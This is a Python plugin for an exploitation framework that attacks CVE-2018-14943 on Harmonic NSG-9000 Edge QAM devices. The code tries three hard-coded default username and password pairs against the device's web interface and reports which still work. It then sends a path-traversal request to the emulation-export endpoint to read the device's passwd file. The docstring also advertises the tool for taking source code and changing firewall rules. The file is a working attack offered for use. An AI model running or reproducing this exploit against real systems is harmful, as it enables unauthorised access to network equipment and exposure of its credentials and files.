#!/usr/bin/python3

'''
*-----------------*
|CVE-2018-14943   |
*-----------------*
    https://www.cvedetails.com/cve/CVE-2018-14943/
    REALLY simple exploit aims Edge QAM system for ip network.
    Model: NSG-9000
    Brand: Harmonic
    some use of default credential (admin, guest and config)
    you can get any file with post request.

    useful to get and modify iptables, get source code and so on ...
    export.html : export config file
    webapp.py: get source code
    logs: /monitoring/alarmLog.html#
    ........
'''

import requests
import re
import core.logger as log
from .IPlugin import IPlugin, connection_type
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth

class Plugin(IPlugin):

    def __init__(self):
        super().__init__()
        self.relative_url = "/webapp.py"
        self.connection_type = connection_type.WEB
        self.port = 80
        self.list_auth = [("admin", "nsgadmin"), 
        ("guest", "nsgguest"), 
        ("config", "nsgconfig")]

    def config(self):
        pass

    def exec(self, data):
        print("\nYou can get source code on this url : ", data.url, "\n\n")
        for username, passwd in self.list_auth:
            res = requests.get(data.url, allow_redirects=True,
                                    verify=False, timeout=2, 
                                    auth=HTTPBasicAuth(username, passwd))
            if res.status_code == 200:
                print(username, ":", passwd, " still used ...")
            else:
                print(username, " password changed")
        ip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', data.url)[0]
        url = 'http://{}:{}{}'.format(ip, 80, "/PY/EMULATION_EXPORT")
        passwd_file_res = requests.post(url, allow_redirects=True,
                                    verify=False, timeout=2, 
                                    auth=HTTPBasicAuth(username, passwd),
                                    data="FileName=/../../../passwd",
                                    stream=True)
        print ("\noups ... a passwd file:\n", passwd_file_res.text)